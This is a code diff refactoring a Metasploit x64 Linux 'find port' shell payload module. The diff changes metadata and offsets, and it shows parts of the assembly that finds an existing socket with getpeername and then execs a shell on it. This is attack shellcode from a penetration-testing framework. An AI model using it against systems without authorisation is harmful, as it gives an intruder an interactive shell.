@@ -1,45 +1,41 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/find_port'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
-
 module MetasploitModule
-
-  CachedSize = 91
+  CachedSize = 98
 
   include Msf::Payload::Single
-  include Msf::Payload::Linux
+  include Msf::Payload::Linux::X64::Prepends
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Command Shell, Find Port Inline',
-      'Description'   => 'Spawn a shell on an established connection',
-      'Author'        => 'mak',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X86_64,
-      'Handler'       => Msf::Handler::FindPort,
-      'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Command Shell, Find Port Inline',
+        'Description' => 'Spawn a shell on an established connection',
+        'Author' => 'mak',
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::FindPort,
+        'Session' => Msf::Sessions::CommandShellUnix,
+        'Payload' => {
           'Offsets' =>
-            {
-              'CPORT' => [ 32, 'n' ],
-            },
+                  {
+                    'CPORT' => [ 39, 'n' ]
+                  },
 
-          'Assembly' => %Q|
+          'Assembly' => %(
             xor rdi,rdi
             xor rbx,rbx
-            mov bl,0x14
+            mov bl,0x18
             sub rsp,rbx
             lea rdx,[rsp]
-            lea rsi,[rsp+4]
+            mov [rdx], 0x10
+            lea rsi,[rsp+8]
           find_port:
             push 0x34     ; getpeername
             pop rax
@@ -69,14 +65,13 @@ module MetasploitModule
             push 0x3b     ; execve
             pop rax
             syscall
-          |
+          )
         }
-      ))
+      )
+    )
   end
 
   def size
     return 91
   end
-
-
 end
